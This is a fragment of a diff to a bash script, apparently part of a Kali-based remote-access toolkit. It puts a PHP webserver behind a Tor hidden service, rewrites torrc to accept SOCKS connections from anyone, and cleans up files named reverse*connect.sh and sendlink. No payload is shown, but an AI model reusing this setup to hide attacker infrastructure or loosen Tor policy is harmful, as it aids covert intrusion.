 	fi
-	if (grep -Fxq "HiddenServicePort $lport 127.0.0.1:$lport" /etc/tor/torrc); then
-	    sleep 1
+	if (grep -Fxq "HiddenServicePort $1 127.0.0.1:$1" /etc/tor/torrc); then
+	    	sleep 1
 	else
-	    echo "HiddenServicePort $lport 127.0.0.1:$lport" >> /etc/tor/torrc
+	    	echo "HiddenServicePort $1 127.0.0.1:$1" >> /etc/tor/torrc
+		printf "\e[1;92m[\e[0m*\e[1;92m] Adding HiddenServicePort $1 to Tor Config...\n"
 	fi
 	sed -i 's/#SocksPolicy\ reject\ \*/SocksPolicy\ accept\ \*/g' /etc/tor/torrc
+	printf "\e[1;92m[\e[0m*\e[1;92m] Restarting Tor for new Tor hidden service... \n"
 	killall tor		
 	systemctl restart tor 
 	sleep 10
 	journalctl -b --no-pager | grep -i tor | tail -n40 | grep -i warn
-	printf "\n\e[92mSetting up Tor hidden service... \n"
 	eip="curl ipinfo.io/ip"
-	printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your external Internet IP address is: \e[37;1m"
-	$eip
+	printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Your external Internet IP address is: \e[37;1m"; $eip
 	tip="torsocks curl ipinfo.io/ip"
-	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your Torified external IP address is: \e[37;1m"
-	$tip
+	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Your external Torified IP address is: \e[37;1m"; $tip
 	if [[ $eip == $tip ]]; then
 		printf "\e[91mTOR FAILED.  IPs are the SAME!!!"
 		printf "\e[91mMake sure your ISP or network isn't blocking Tor.  Press Enter for menu\e[92m"
 		read me
-	fi	
+		menutor
+	fi
 	hostname=$(cat /var/lib/tor/myservices/hostname)
-	torview
-	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Tor hidden service hostname is: $hostname\n\n"
-	printf "   You can connect to your new PHP Webserver using: \n    \e[37;1m> http://$hostname:$lport throught Tor\n\n\e[92m"
-	printf "   You can connect to your new PHP Webserver using: \n    \e[37;1m> http://$hostname.to:$lport throught the Internet\n\n\e[92m"
+	torview $1 $hostname
+	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Tor hidden service hostname is: $hostname\n\n"
+	printf "\e[1;92m[\e[0m*\e[1;92m] You can connect to your new PHP Webserver using: \n    \e[37;1m> http://$hostname:$1 throught Tor\n\n\e[92m"
+	printf "\e[1;92m[\e[0m*\e[1;92m] You can connect to your new PHP Webserver using: \n    \e[37;1m> http://$hostname.to:$1 throught the Internet\n\n\e[92m"
 	printf "If the page doesn't load, wait a minute and try again...\n\nPress enter to return to main menu or CTRL+C to end session"
 	read waitfortor
-	menutor
 }
 
 stop() {
@@ -919,8 +831,9 @@ stop() {
 	killall xterm > /dev/null 2>&1
 	killall Xtightvnc > /dev/null 2>&1
 	killall -u kalitor
-	rm -rf reverse-connect.sh > /dev/null 2>&1
-	rm -rf reverse-ngrok-connect.sh > /dev/null 2>&1
+	rm -rf reverse*connect.sh > /dev/null 2>&1
+	rm -rf testme.sh > /dev/null 2>&1
+	rm -rf sendlink > /dev/null 2>&1
 	exit 1
 }
 	
@@ -938,5 +851,4 @@ banner() {
 
 banner
 startmenu
-
 
